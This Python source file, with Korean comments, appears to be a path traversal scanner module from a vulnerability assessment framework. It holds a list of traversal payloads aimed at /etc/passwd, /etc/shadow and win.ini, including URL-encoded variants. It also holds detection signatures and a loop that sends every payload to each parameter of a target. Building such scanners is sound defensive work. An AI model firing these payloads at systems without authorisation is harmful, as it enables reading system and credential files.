"""
Path Traversal Testing Tool

OWASP: A05:2025 - Injection
CWE:   CWE-22 (Path Traversal)

extra 옵션:
    - payload_list (list[str]): 테스트할 경로 순회 페이로드 목록
      기본값: 기본 페이로드 세트 사용
"""

from __future__ import annotations

import requests as http_client
from urllib.parse import urljoin

from va_mcp.core.base import BaseTool
from va_mcp.core.constants import Confidence, ErrorCode, Severity, ToolStatus
from va_mcp.core.schemas import Evidence, ToolInput, ToolResult
from va_mcp.core.utils import (
    build_tool_error,
    mask_sensitive,
    sanitize_request_body,
    sanitize_response_sample,
    utc_now_iso,
)


# 기본 Path Traversal 페이로드
DEFAULT_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "....//....//....//etc/passwd",
    "../../../etc/shadow",
    "../../../windows/win.ini",
    "..\\..\\..\\windows\\win.ini",
    "../../../windows/system32/drivers/etc/hosts",
    "....//....//....//windows/win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\windows\\win.ini",
]

# 경로 순회 성공을 나타내는 응답 시그니처 (소문자 비교)
PATH_TRAVERSAL_SIGNATURES = [
    "root:",                        # /etc/passwd
    "daemon:",                      # /etc/passwd
    "/bin/bash",                    # /etc/passwd
    "/bin/sh",                      # /etc/passwd
    "[extensions]",                 # win.ini
    "[fonts]",                      # win.ini
    "for 16-bit app support",       # win.ini
    "# host database",              # hosts 파일
    "localhost",                    # hosts 파일
]


class PathTraversalTool(BaseTool):
    tool_id = "path_traversal"
    tool_name = "Path Traversal Testing"

    def run(self, tool_input: ToolInput) -> ToolResult:
        started_at = utc_now_iso()

        try:
            # ── 입력 검증 ──────────────────────────────────
            if tool_input.request is None:
                ended_at = utc_now_iso()
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.SKIPPED,
                    severity=Severity.INFO,
                    confidence=Confidence.LOW,
                    title="요청 정보 없음",
                    description="ToolInput.request가 None입니다.",
                    evidence=[],
                    started_at=started_at,
                    ended_at=ended_at,
                )

            # ── 옵션 추출 ──────────────────────────────────
            extra = tool_input.options.extra
            payload_list = extra.get("payload_list", DEFAULT_PAYLOADS)

            max_requests = tool_input.options.max_requests
            timeout_sec = tool_input.options.timeout / 1000

            # ── 테스트 대상 파라미터 결정 ─────────────────────
            method = tool_input.request.method.upper()
            path = tool_input.request.path
            headers = dict(tool_input.request.headers)
            query = dict(tool_input.request.query)
            body = dict(tool_input.request.body) if tool_input.request.body else {}

            if method == "GET":
                test_params = list(query.keys())
            else:
                test_params = list(body.keys())

            if not test_params:
                ended_at = utc_now_iso()
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.SKIPPED,
                    severity=Severity.INFO,
                    confidence=Confidence.LOW,
                    title="테스트할 파라미터 없음",
                    description="요청에서 테스트할 파라미터를 찾지 못했습니다.",
                    evidence=[],
                    started_at=started_at,
                    ended_at=ended_at,
                )

            # ── 타겟 URL 구성 ─────────────────────────────
            base_url = tool_input.target.base_url.rstrip("/")
            full_url = urljoin(base_url + "/", path.lstrip("/"))

            # ── 페이로드 테스트 루프 ──────────────────────────
            evidences: list[Evidence] = []
            request_count = 0

            for param in test_params:
                for payload in payload_list:
                    if request_count >= max_requests:
                        break

                    try:
                        if method == "GET":
                            test_query = dict(query)
                            test_query[param] = payload
                            resp = http_client.get(
                                full_url,
                                params=test_query,
                                headers=headers,
                                timeout=timeout_sec,
                                allow_redirects=False,
                            )
                            request_info = {
                                "method": "GET",
                                "path": path,
                                "headers": mask_sensitive(headers),
                                "query": {param: payload},
                            }
                        else:
                            test_body = dict(body)
                            test_body[param] = payload
                            resp = http_client.request(
                                method,
                                full_url,
                                headers=headers,
                                json=test_body,
                                timeout=timeout_sec,
                                allow_redirects=False,
                            )
                            request_info = {
                                "method": method,
                                "path": path,
                                "headers": mask_sensitive(headers),
                                "body": sanitize_request_body(test_body),
                            }

                        request_count += 1

                        response_lower = resp.text.lower()
                        detected = [
                            sig for sig in PATH_TRAVERSAL_SIGNATURES
                            if sig in response_lower
                        ]

                        if detected:
                            evidences.append(
                                Evidence(
                                    request=request_info,
                                    response_status=resp.status_code,
                                    response_headers=dict(resp.headers),
                                    response_body_sample=sanitize_response_sample(resp.text),
                                    note=(
                                        f"파라미터 '{param}'에 페이로드 '{payload}' 삽입 시 "
                                        f"파일 내용 시그니처 감지: {detected[:3]}"
                                    ),
                                )
                            )

                    except http_client.RequestException:
                        request_count += 1
                        continue

                if request_count >= max_requests:
                    break

            # ── 결과 판정 ──────────────────────────────────
            if evidences:
                ended_at = utc_now_iso()
                return ToolResult(
                    tool_id=self.tool_id,
                    tool_name=self.tool_name,
                    status=ToolStatus.VULNERABLE,
                    severity=Severity.HIGH,
                    confidence=Confidence.HIGH,
                    title="Path Traversal 취약점 발견",
                    description=(
                        f"총 {len(evidences)}건의 경로 순회 징후가 감지되었습니다. "
                        f"테스트 파라미터: {test_params}"
                    ),
                    owasp=["A05:2025 Injection"],
                    cwe=["CWE-22"],
                    evidence=evidences,
                    recommendation=(
                        "1. 사용자 입력을 파일 경로에 직접 사용하지 마세요.\n"
                        "2. 파일 접근 시 기본 디렉토리(base directory)를 고정하고 벗어나지 못하게 하세요.\n"
                        "3. 입력값에서 ../ 등 경로 순회 문자를 필터링하세요.\n"
                        "4. 화이트리스트 방식으로 허용된 파일명만 접근하게 하세요."
                    ),
                    started_at=started_at,
                    ended_at=ended_at,
                )

            ended_at = utc_now_iso()
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.PASSED,
                severity=Severity.INFO,
                confidence=Confidence.MEDIUM,
                title="Path Traversal 취약점 미발견",
                description=(
                    f"테스트한 파라미터({test_params})에서 "
                    f"경로 순회 징후가 감지되지 않았습니다. "
                    f"(총 {request_count}건 요청)"
                ),
                owasp=["A05:2025 Injection"],
                cwe=["CWE-22"],
                started_at=started_at,
                ended_at=ended_at,
            )

        except Exception as exc:
            ended_at = utc_now_iso()
            return ToolResult(
                tool_id=self.tool_id,
                tool_name=self.tool_name,
                status=ToolStatus.ERROR,
                severity=Severity.INFO,
                confidence=Confidence.LOW,
                title="Path Traversal 테스트 실행 오류",
                description=f"테스트 실행 중 예외가 발생했습니다: {str(exc)}",
                started_at=started_at,
                ended_at=ended_at,
                errors=[
                    build_tool_error(
                        error_code=ErrorCode.INTERNAL_ERROR,
                        error_message=str(exc),
                        retryable=False,
                    )
                ],
            )